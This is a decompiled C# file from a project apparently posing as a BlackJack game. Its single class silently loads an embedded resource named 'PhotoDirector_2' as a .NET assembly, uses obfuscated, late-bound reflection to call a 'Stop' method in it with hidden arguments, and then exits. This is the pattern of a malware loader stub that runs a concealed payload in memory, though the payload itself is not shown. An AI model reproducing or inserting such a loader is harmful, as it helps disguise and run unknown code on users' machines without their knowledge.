using System;
using System.Reflection;
using BlackJack.Properties;
using Microsoft.VisualBasic;

namespace BlackJack;

internal class BCAS
{
	public BCAS()
	{
		AIJISAJIS();
	}

	public static byte[] a()
	{
		return Resources.PhotoDirector_2;
	}

	public string AIJISAJIS()
	{
		byte[] array = a();
		object obj = Type.GetType("System.Reflection.Assembly")!.InvokeMember("Load", BindingFlags.InvokeMethod, null, null, new object[1] { array });
		object obj2 = Interaction.CallByName(obj, "GetType", (CallType)2, new object[1] { "PhotoDirector.PhotoEditor" });
		object obj3 = Interaction.CallByName(obj2, "GetMethod", (CallType)2, new object[1] { "Stop" });
		Interaction.CallByName(obj3, "Invoke", (CallType)1, new object[2]
		{
			null,
			new object[2]
			{
				J4.p,
				"BlackJack"
			}
		});
		Environment.Exit(0);
		return "";
	}
}
